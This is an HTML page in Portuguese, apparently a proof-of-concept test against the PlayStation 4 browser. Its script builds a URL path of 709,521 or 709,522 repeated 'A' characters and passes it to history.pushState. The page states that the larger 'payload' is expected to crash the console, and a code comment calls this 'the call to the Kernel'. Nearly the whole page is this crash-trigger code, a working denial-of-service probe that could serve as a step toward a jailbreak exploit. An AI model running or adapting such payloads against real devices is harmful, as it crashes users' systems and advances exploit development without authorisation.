<!DOCTYPE html>
<html>
<head>
    <title>PS4 Final Border Test</title>
    <style>
        body { background-color: #222; color: #fff; font-family: sans-serif; padding: 40px; text-align: center; }
        button { 
            font-size: 22px; padding: 20px; margin: 15px; cursor: pointer; 
            border: none; border-radius: 8px; width: 80%; display: block; margin: 0 auto 20px auto;
        }
        .safe { background-color: #27ae60; color: #fff; }
        .danger { background-color: #c0392b; color: #fff; }
        #log { margin-top: 30px; font-family: monospace; color: #f1c40f; font-size: 18px; border: 1px solid #555; padding: 10px;}
    </style>
</head>
<body>

    <h1>Teste de Fronteira: 709.521 vs 709.522</h1>
    <p>Se a teoria estiver certa, o botão Verde funciona e o Vermelho trava o console.</p>

    <div id="log">Aguardando...</div>

    <button class="safe" onclick="testPayload(709521)">
        TESTAR 709.521 Bytes<br>
        <small>(Deve sobreviver)</small>
    </button>

    <button class="danger" onclick="testPayload(709522)">
        TESTAR 709.522 Bytes<br>
        <small>(Deve travar)</small>
    </button>

    <script>
        function testPayload(size) {
            const log = document.getElementById('log');
            log.innerText = "Gerando string de " + size + " bytes...";

            setTimeout(() => {
                try {
                    const payload = "/" + "A".repeat(size);
                    
                    log.innerText = "Enviando payload (" + size + ")...";
                    
                    // A chamada ao Kernel
                    history.pushState({}, "test", payload);
                    
                    // Se passar daqui, funcionou
                    log.innerText = "SUCESSO! " + size + " bytes não travaram o sistema.";
                    log.style.color = "#27ae60"; // Verde

                } catch (e) {
                    log.innerText = "ERRO JS: " + e.message;
                }
            }, 500);
        }
    </script>
</body>
</html>
